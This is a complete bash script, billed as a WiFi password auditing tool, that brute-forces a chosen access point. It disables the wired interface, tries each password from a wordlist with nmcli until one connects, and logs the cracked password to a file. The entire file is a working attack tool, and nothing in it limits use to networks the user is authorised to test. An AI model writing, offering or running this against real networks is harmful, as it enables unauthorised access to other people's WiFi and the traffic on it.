#!/bin/bash

# WiFi Password Auditing Tool - BSSID Version
# Usage: sudo ./wifi-bruteforce-bssid.sh <BSSID> <WORDLIST_FILE>

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Check arguments
if [ $# -lt 2 ]; then
    echo "Usage: sudo ./wifi-bruteforce-bssid.sh <BSSID> <WORDLIST>"
    echo "Example: sudo ./wifi-bruteforce-bssid.sh 94:3C:96:EC:9F:?? /path/to/passwords.txt"
    exit 1
fi

BSSID="$1"
WORDLIST="$2"
INTERFACE="wlp4s0"
ETHERNET="enp2s0"

cleanup() {
    echo -e "\n${YELLOW}Cleaning up...${NC}"
    ip link set "$ETHERNET" up 2>/dev/null
    nmcli device connect "$ETHERNET" 2>/dev/null
    nmcli radio wifi on
    exit 0
}

trap cleanup SIGINT SIGTERM

# Disable ethernet
echo "Disabling ethernet..."
ip link set "$ETHERNET" down
sleep 2

# Check if wordlist exists
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}Error: Wordlist file not found: $WORDLIST${NC}"
    exit 1
fi

# Count passwords
TOTAL=$(wc -l < "$WORDLIST")
ATTEMPT=0
FOUND=false

# Clear screen for better visibility
clear

echo -e "${YELLOW}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║         ${BOLD}WiFi Password Auditing Tool - BSSID Mode${NC}${YELLOW}         ║${NC}"
echo -e "${YELLOW}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BOLD}Target BSSID:${NC} ${CYAN}$BSSID${NC}"
echo -e "${BOLD}Interface:${NC}    ${CYAN}$INTERFACE${NC}"
echo -e "${BOLD}Wordlist:${NC}     ${CYAN}$WORDLIST${NC} (${TOTAL} passwords)"
echo -e "${BOLD}Status:${NC}       ${YELLOW}Starting attack...${NC}"
echo ""

# Main loop
while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do
    PASSWORD=$(echo "$PASSWORD" | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    [ -z "$PASSWORD" ] && continue
    
    ATTEMPT=$((ATTEMPT + 1))
    
    # Calculate percentage
    PERCENT=$((ATTEMPT * 100 / TOTAL))
    
    # Create progress bar
    BAR_WIDTH=40
    FILLED=$((PERCENT * BAR_WIDTH / 100))
    EMPTY=$((BAR_WIDTH - FILLED))
    
    printf "\r${BLUE}[%s]${NC} ${YELLOW}Progress: [${NC}" "$(date +%H:%M:%S)"
    printf "%${FILLED}s" | tr ' ' '█'
    printf "%${EMPTY}s" | tr ' ' '░'
    printf "${YELLOW}] ${GREEN}%3d%%${NC} ${CYAN}Attempt: %d/%d${NC}" "$PERCENT" "$ATTEMPT" "$TOTAL"
    echo -ne " ${YELLOW}Testing: '${PASSWORD}'${NC}  \r"
    
    # Disconnect first
    nmcli device disconnect "$INTERFACE" &>/dev/null
    sleep 1
    
    # Try to connect using BSSID
    nmcli device wifi connect "$BSSID" password "$PASSWORD" ifname "$INTERFACE" &>/dev/null &
    PID=$!
    
    # Wait and check
    CONNECTED=false
    for i in {1..15}; do
        sleep 1
        
        # Check if connected to this BSSID
        CURRENT_BSSID=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o "Access Point: [0-9A-F:]*" | cut -d' ' -f3)
        IP_ADDR=$(ip -4 addr show "$INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')
        SIGNAL=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o "Signal level=-[0-9]*" | cut -d'=' -f2)
        
        if [ "$CURRENT_BSSID" = "$BSSID" ] && [ -n "$IP_ADDR" ]; then
            CONNECTED=true
            break
        fi
    done
    
    kill $PID 2>/dev/null
    
    if [ "$CONNECTED" = true ]; then
        # Clear the current line and show success message
        echo -e "\n\n${GREEN}╔═══════════════════════ 🎉 SUCCESS 🎉 ═══════════════════════╗${NC}"
        echo -e "${GREEN}║                                                              ║${NC}"
        echo -e "${GREEN}║  ${BOLD}WiFi Password Found!${NC}${GREEN}                                        ║${NC}"
        echo -e "${GREEN}║                                                              ║${NC}"
        echo -e "${GREEN}║  ${BOLD}BSSID:${NC}      ${CYAN}$BSSID${NC}                                         ${GREEN}║${NC}"
        echo -e "${GREEN}║  ${BOLD}Password:${NC}   ${YELLOW}${BOLD}$PASSWORD${NC}${GREEN}                                         ${GREEN}║${NC}"
        echo -e "${GREEN}║  ${BOLD}IP Address:${NC} ${CYAN}$IP_ADDR${NC}                                         ${GREEN}║${NC}"
        echo -e "${GREEN}║  ${BOLD}Signal:${NC}     ${CYAN}${SIGNAL} dBm${NC}                                         ${GREEN}║${NC}"
        echo -e "${GREEN}║  ${BOLD}Attempts:${NC}   ${CYAN}$ATTEMPT/$TOTAL (${PERCENT}%)${NC}                                   ${GREEN}║${NC}"
        echo -e "${GREEN}║                                                              ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
        
        # Save to file
        echo "$BSSID:$PASSWORD" >> found_passwords.txt
        echo -e "\n${BLUE}[+] Password saved to found_passwords.txt${NC}"
        
        FOUND=true
        break
    fi
    
done < "$WORDLIST"

# If not found
if [ "$FOUND" = false ]; then
    echo -e "\n\n${RED}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║                                                              ║${NC}"
    echo -e "${RED}║            ${BOLD}❌ PASSWORD NOT FOUND ❌${NC}${RED}                       ║${NC}"
    echo -e "${RED}║                                                              ║${NC}"
    echo -e "${RED}║  Tried ${CYAN}$TOTAL${RED} passwords for BSSID: ${CYAN}$BSSID${RED}            ║${NC}"
    echo -e "${RED}║                                                              ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
fi

# Cleanup
echo ""
echo -e "${YELLOW}[*] Restoring network connections...${NC}"
ip link set "$ETHERNET" up 2>/dev/null
nmcli device connect "$ETHERNET" 2>/dev/null
trap - SIGINT SIGTERM

echo -e "${GREEN}[✓] Script completed${NC}"
